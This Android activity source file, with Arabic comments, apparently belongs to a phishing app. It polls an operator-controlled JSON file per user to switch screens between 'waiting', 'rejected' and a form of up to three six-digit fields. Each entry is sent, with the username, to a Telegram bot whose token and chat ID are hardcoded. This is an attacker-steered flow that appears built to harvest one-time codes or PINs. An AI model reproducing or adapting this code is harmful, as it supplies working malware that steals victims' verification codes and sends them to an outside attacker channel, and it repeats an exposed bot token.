package com.ban.ab;

import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import org.json.JSONObject;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SecondActivity extends AppCompatActivity {

    private LinearLayout layoutWaiting, layoutRejected, layoutFields, groupField1, groupField2, groupField3;
    private TextView txtRejectReason;
    private EditText field1, field2, field3;
    private Button btnConfirm1, btnConfirm2, btnConfirm3, btnFinalOrder;
    private String userName;
    private final OkHttpClient client = new OkHttpClient();
    private final Handler handler = new Handler();
    private Runnable refreshRunnable;

    // --- إعدادات المراقبة ---
    // الرابط الجديد بدلاً من القديم
private final String GITHUB_RAW_URL = "https://cdn.jsdelivr.net/gh/abdullah14120/ban@main/commands/";
    private final String BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
    private final String CHAT_ID = "1749638488";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        initViews();
        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "unknown");
        
        setupButtons();
        startAutoRefresh();
    }

    private void initViews() {
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutFields = findViewById(R.id.layoutFields);
        groupField1 = findViewById(R.id.groupField1);
        groupField2 = findViewById(R.id.groupField2);
        groupField3 = findViewById(R.id.groupField3);
        txtRejectReason = findViewById(R.id.txtRejectReason);
        field1 = findViewById(R.id.field1);
        field2 = findViewById(R.id.field2);
        field3 = findViewById(R.id.field3);
        btnConfirm1 = findViewById(R.id.btnConfirm1);
        btnConfirm2 = findViewById(R.id.btnConfirm2);
        btnConfirm3 = findViewById(R.id.btnConfirm3);
        btnFinalOrder = findViewById(R.id.btnFinalOrder);
    }

    private void setupButtons() {
        btnConfirm1.setOnClickListener(v -> sendToTg("حقل 1", field1.getText().toString()));
        btnConfirm2.setOnClickListener(v -> sendToTg("حقل 2", field2.getText().toString()));
        btnConfirm3.setOnClickListener(v -> sendToTg("حقل 3", field3.getText().toString()));
    }

    private void startAutoRefresh() {
        refreshRunnable = new Runnable() {
            @Override public void run() { checkCommand(); handler.postDelayed(this, 5000); }
        };
        handler.post(refreshRunnable);
    }

    private void checkCommand() {
        String url = GITHUB_RAW_URL + userName + ".json";
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    try {
                        JSONObject json = new JSONObject(response.body().string());
                        runOnUiThread(() -> updateUI(json));
                    } catch (Exception ignored) {}
                }
            }
        });
    }

    private void updateUI(JSONObject json) {
        try {
            String status = json.getString("status");
            
            // الحالة الافتراضية هي الانتظار إلا إذا تغير الـ JSON
            layoutWaiting.setVisibility(status.equals("waiting") ? View.VISIBLE : View.GONE);
            layoutRejected.setVisibility(status.equals("rejected") ? View.VISIBLE : View.GONE);
            layoutFields.setVisibility(status.equals("fields_form") ? View.VISIBLE : View.GONE);

            if (status.equals("rejected")) {
                txtRejectReason.setText(json.optString("reject_reason", "مرفوض لعدم استيفاء الشروط"));
            }
            
            if (status.equals("fields_form")) {
                int count = json.optInt("visible_fields", 1);
                groupField1.setVisibility(count >= 1 ? View.VISIBLE : View.GONE);
                groupField2.setVisibility(count >= 2 ? View.VISIBLE : View.GONE);
                groupField3.setVisibility(count >= 3 ? View.VISIBLE : View.GONE);
                btnFinalOrder.setVisibility(json.optBoolean("show_final_button", false) ? View.VISIBLE : View.GONE);
            }
        } catch (Exception ignored) {}
    }

    private void sendToTg(String f, String v) {
        if (v.length() < 6) { Toast.makeText(this, "أدخل 6 أرقام", Toast.LENGTH_SHORT).show(); return; }
        RequestBody body = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", "🔔 تحديث من " + userName + ":\n" + f + " ⬅️ " + v)
                .build();
        client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").post(body).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {
                runOnUiThread(() -> Toast.makeText(SecondActivity.this, "تم الإرسال للإدارة", Toast.LENGTH_SHORT).show());
            }
        });
    }

    @Override protected void onDestroy() { super.onDestroy(); handler.removeCallbacks(refreshRunnable); }
}
